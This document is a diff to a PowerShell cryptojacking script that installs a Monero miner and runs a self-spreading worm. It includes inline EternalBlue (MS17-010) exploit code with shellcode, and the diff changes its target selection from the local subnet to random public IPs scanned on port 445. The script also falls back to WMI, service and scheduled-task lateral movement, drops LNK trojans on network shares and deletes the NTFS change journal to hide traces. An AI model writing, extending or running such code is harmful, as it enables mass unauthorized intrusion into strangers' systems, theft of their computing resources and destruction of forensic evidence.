@@ -1,8 +1,9 @@
+
 # ============================================================
 #  MONERO MINER SETUP v4 -- BULLETPROOF (FIXED)
 #  + FULL WORM MODULE WITH INLINE ETERNALBLUE EXPLOIT
+#  + INTERNET-WIDE RANDOM IP SCANNING
 #  Single file. No external binaries. No compilation required.
-#  Push to GitHub, run one command, done.
 # ============================================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -22,8 +23,8 @@ function Show($icon, $msg) { Write-Host "  $icon  $msg" }
 
 Write-Host ""
 Write-Host "  ====================================================" -ForegroundColor Cyan
-Write-Host "    MONERO MINER SETUP v4 + WORM" -ForegroundColor Cyan
-Write-Text "  ====================================================" -ForegroundColor Cyan
+Write-Host "    MONERO MINER SETUP v4 + WORM (INTERNET-WIDE)" -ForegroundColor Cyan
+Write-Host "  ====================================================" -ForegroundColor Cyan
 Write-Host "  Pool:   MoneroOcean (auto-profit-switching)" -ForegroundColor Gray
 Write-Host "  Worker: $WORKER" -ForegroundColor Gray
 Write-Host "  ====================================================" -ForegroundColor Cyan
@@ -454,6 +455,7 @@ try { $myPath = $MyInvocation.MyCommand.Definition; if ($myPath -and $myPath -li
 #                PHASE 2: FULL WORM MODULE
 #                Self-contained. No external binaries.
 #                EternalBlue compiles inline via .NET.
+#                INTERNET-WIDE RANDOM IP SCANNING
 # ============================================================
 
  $WORM_ENABLED = $true
@@ -595,7 +597,6 @@ namespace EBExploit {
             // Overflow trigger — oversized FEA list
             byte[] cmdBytes = Encoding.ASCII.GetBytes(payloadCmd);
             byte[] shellcode = new byte[256 + cmdBytes.Length];
-            // PEB -> kernel32 -> WinExec resolution shellcode
             int sc = 0;
             shellcode[sc++] = 0x65; shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x04; shellcode[sc++] = 0x25;
             shellcode[sc++] = 0x60; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00;
@@ -705,77 +706,80 @@ Start-Job -ScriptBlock {
         try { $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; Add-Content -Path "$base\worm.log" -Value "[$ts] $msg" -ErrorAction SilentlyContinue } catch {}
     }
     
-    function Get-LocalSubnet {
-        try {
-            $adapters = Get-NetIPConfiguration -ErrorAction SilentlyContinue | 
-                Where-Object { $_.IPv4DefaultGateway -and $_.IPv4Address.IPAddress -notmatch "^169\.254\." -and $_.IPv4Address.IPAddress -notmatch "^127\." }
-            $subnets = @()
-            foreach ($adapter in $adapters) {
-                $ip = $adapter.IPv4Address.IPAddress
-                $mask = $adapter.IPv4Address.PrefixLength
-                if (-not $mask) { $mask = 24 }
-                if ($ip -and $ip -match "^\d+\.\d+\.\d+\.\d+$") {
-                    $octets = $ip.Split('.')
-                    $subnets += "$($octets[0]).$($octets[1]).$($octets[2]).0/$mask"
-                }
-            }
-            if ($subnets.Count -eq 0) {
-                $localIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
-                    Where-Object { $_.IPAddress -notmatch "^169\.254\." -and $_.IPAddress -notmatch "^127\." -and $_.PrefixOrigin -eq "Dhcp" } | 
-                    Select-Object -First 1).IPAddress
-                if ($localIP) {
-                    $octets = $localIP.Split('.')
-                    $subnets += "$($octets[0]).$($octets[1]).$($octets[2]).0/24"
-                }
-            }
-            return $subnets | Select-Object -Unique
-        } catch { return @("192.168.1.0/24") }
+    function Get-RandomPublicIP {
+        while ($true) {
+            $a = Get-Random -Minimum 1 -Maximum 255
+            $b = Get-Random -Minimum 0 -Maximum 256
+            $c = Get-Random -Minimum 0 -Maximum 256
+            $d = Get-Random -Minimum 1 -Maximum 255
+
+            if ($a -eq 10) { continue }
+            if ($a -eq 172 -and $b -ge 16 -and $b -le 31) { continue }
+            if ($a -eq 192 -and $b -eq 168) { continue }
+            if ($a -eq 127) { continue }
+            if ($a -eq 169 -and $b -eq 254) { continue }
+            if ($a -eq 100 -and $b -ge 64 -and $b -le 127) { continue }
+            if ($a -eq 0) { continue }
+            if ($a -ge 224) { continue }
+            if ($a -eq 192 -and $b -eq 0 -and $c -eq 2) { continue }
+            if ($a -eq 198 -and ($b -eq 18 -or $b -eq 19)) { continue }
+            if ($a -eq 198 -and $b -eq 51 -and $c -eq 100) { continue }
+            if ($a -eq 203 -and $b -eq 0 -and $c -eq 113) { continue }
+            if ($a -eq 192 -and $b -eq 88 -and $c -eq 99) { continue }
+
+            return "$a.$b.$c.$d"
+        }
     }
     
     function Scan-SMBHosts {
-        param([string[]]$subnets)
-        $openHosts = @()
-        foreach ($subnet in $subnets) {
-            WLog "Scanning subnet: $subnet"
-            $parts = $subnet.Split('/')
-            $baseIP = $parts[0]
-            $octets = $baseIP.Split('.')
-            
-            $runspacePool = [runspacefactory]::CreateRunspacePool(1, 50)
-            $runspacePool.Open()
-            $jobs = [System.Collections.ArrayList]::new()
-            
-            foreach ($i in 1..254) {
-                $target = "$($octets[0]).$($octets[1]).$($octets[2]).$i"
-                $ps = [PowerShell]::Create()
-                $ps.RunspacePool = $runspacePool
-                [void]$ps.AddScript({
-                    param($t)
-                    $tcp = New-Object System.Net.Sockets.TcpClient
-                    $iar = $tcp.BeginConnect($t, 445, $null, $null)
-                    $success = $iar.AsyncWaitHandle.WaitOne(800, $false)
-                    if ($success -and $tcp.Connected) { $tcp.Close(); return $t }
-                    $tcp.Close()
-                    return $null
-                })
-                [void]$ps.AddArgument($target)
-                $job = $ps.BeginInvoke()
-                $jobs.Add([PSCustomObject]@{ PowerShell = $ps; Job = $job; Target = $target })
-            }
-            
-            foreach ($j in $jobs) {
-                $result = $j.PowerShell.EndInvoke($j.Job)
-                if ($result -and $result[0]) {
-                    $openHosts += $result[0]
-                    WLog "Host $($result[0]) has port 445 open"
-                }
-                $j.PowerShell.Dispose()
-            }
-            
-            $runspacePool.Close()
-            $runspacePool.Dispose()
+        param([int]$Count = 500)
+        $openHosts = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
+        
+        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 100)
+        $runspacePool.Open()
+        $jobs = [System.Collections.ArrayList]::new()
+
+        $ipBatch = @()
+        for ($i = 0; $i -lt $Count; $i++) {
+            $ipBatch += Get-RandomPublicIP
         }
-        return $openHosts
+
+        WLog "Scanning $Count random internet IPs for port 445..."
+
+        foreach ($ip in $ipBatch) {
+            $ps = [PowerShell]::Create()
+            $ps.RunspacePool = $runspacePool
+            [void]$ps.AddScript({
+                param($t)
+                $tcp = New-Object System.Net.Sockets.TcpClient
+                $iar = $tcp.BeginConnect($t, 445, $null, $null)
+                $success = $iar.AsyncWaitHandle.WaitOne(1200, $false)
+                if ($success -and $tcp.Connected) {
+                    $tcp.Close()
+                    return $t
+                }
+                try { $tcp.Close() } catch {}
+                return $null
+            })
+            [void]$ps.AddArgument($ip)
+            $job = $ps.BeginInvoke()
+            $jobs.Add([PSCustomObject]@{ PowerShell = $ps; Job = $job; Target = $ip })
+        }
+
+        foreach ($j in $jobs) {
+            $result = $j.PowerShell.EndInvoke($j.Job)
+            if ($result -and $result[0]) {
+                $openHosts.Add($result[0])
+                WLog "Host $($result[0]) has port 445 open"
+            }
+            $j.PowerShell.Dispose()
+        }
+
+        $runspacePool.Close()
+        $runspacePool.Dispose()
+
+        WLog "Scan complete. $($openHosts.Count) hosts with port 445 open."
+        return $openHosts.ToArray()
     }
     
     function Test-EBVuln {
@@ -1021,7 +1025,7 @@ sh.Run "fsutil usn deletejournal /d C:", 0, True
     
     # ---- WORM MAIN ----
     WLog "============================================"
-    WLog "WORM MODULE STARTING (background)"
+    WLog "WORM MODULE STARTING (background) - INTERNET WIDE"
     WLog "Max targets: $max"
     WLog "Expiry: $expiry"
     WLog "EB Exploit: $ebReady"
@@ -1029,12 +1033,16 @@ sh.Run "fsutil usn deletejournal /d C:", 0, True
     
     if (-not (Test-Gov)) { WLog "Governor blocked. Exiting."; return }
     
-    WLog "Phase 1: Network discovery"
-    $subnets = Get-LocalSubnet
-    WLog "Subnets: $($subnets -join ', ')"
-    
-    $smbHosts = Scan-SMBHosts -subnets $subnets
+    # Internet-wide scan — generate 500 random IPs, scan for 445
+    WLog "Phase 1: Internet-wide random IP discovery (port 445)"
+    $smbHosts = Scan-SMBHosts -Count 500
     WLog "SMB hosts found: $($smbHosts.Count)"
+
+    if ($smbHosts.Count -eq 0) {
+        WLog "No hosts found in first batch. Generating more..."
+        $smbHosts = Scan-SMBHosts -Count 500
+        WLog "SMB hosts found: $($smbHosts.Count)"
+    }
     
     WLog "Phase 2: Exploitation (parallel)"
     $infected = 0
@@ -1042,6 +1050,7 @@ sh.Run "fsutil usn deletejournal /d C:", 0, True
     
     foreach ($ip in $smbHosts) {
         if (-not (Test-Gov)) { break }
+        WLog "Testing $ip for MS17-010..."
         if (Test-EBVuln -ip $ip) {
             WLog "$ip vulnerable to MS17-010"
             $success = Invoke-EBExploit -ip $ip
@@ -1049,6 +1058,30 @@ sh.Run "fsutil usn deletejournal /d C:", 0, True
             else { WLog "Exploitation failed on $ip"; $failedHosts += $ip }
         } else { WLog "$ip not vulnerable to MS17-010 (patched)" }
         Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+    }
+
+    # If we didn't hit cap, keep scanning more batches
+    while ((Test-Gov) -and $infected -lt $max) {
+        WLog "Cap not reached ($infected/$max). Scanning another batch..."
+        $smbHosts = Scan-SMBHosts -Count 500
+        WLog "SMB hosts found: $($smbHosts.Count)"
+
+        if ($smbHosts.Count -eq 0) {
+            WLog "No hosts in this batch. Waiting 30s..."
+            Start-Sleep -Seconds 30
+            continue
+        }
+
+        foreach ($ip in $smbHosts) {
+            if (-not (Test-Gov)) { break }
+            if (Test-EBVuln -ip $ip) {
+                WLog "$ip vulnerable to MS17-010"
+                $success = Invoke-EBExploit -ip $ip
+                if ($success) { $infected++; Update-Count; WLog "Infected $ip (Total: $infected)" }
+                else { WLog "Exploitation failed on $ip"; $failedHosts += $ip }
+            } else { WLog "$ip not vulnerable to MS17-010 (patched)" }
+            Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
+        }
     }
     
     WLog "Phase 3: Network share contamination"
@@ -1080,7 +1113,7 @@ sh.Run "fsutil usn deletejournal /d C:", 0, True
 
 Write-Host ""
 Write-Host "  ====================================================" -ForegroundColor Magenta
-Write-Host "    WORM MODULE ACTIVE" -ForegroundColor Magenta
+Write-Host "    WORM MODULE ACTIVE (INTERNET-WIDE)" -ForegroundColor Magenta
 Write-Host "  ====================================================" -ForegroundColor Magenta
 Write-Host "  Max Targets:  $MAX_TARGETS" -ForegroundColor White
 Write-Host "  Expiry:       $WORM_EXPIRY" -ForegroundColor White
@@ -1094,7 +1127,7 @@ Write-Host "  EXECUTION FLOW:" -ForegroundColor Yellow
 Write-Host "    1. Miner installs and starts (done above)" -ForegroundColor Gray
 Write-Host "    2. EternalBlue exploit compiles via .NET csc.exe" -ForegroundColor Gray
 Write-Host "    3. Worm spawns in background job" -ForegroundColor Gray
-Write-Host "    4. Scans local subnet for SMB hosts" -ForegroundColor Gray
+Write-Host "    4. Scans random INTERNET IPs for port 445" -ForegroundColor Gray
 Write-Host "    5. Fires EternalBlue at vulnerable hosts" -ForegroundColor Gray
 Write-Host "    6. Falls back to WMI/SCM/Task if EB misses" -ForegroundColor Gray
 Write-Host "    7. Drops LNK trojans on network shares" -ForegroundColor Gray
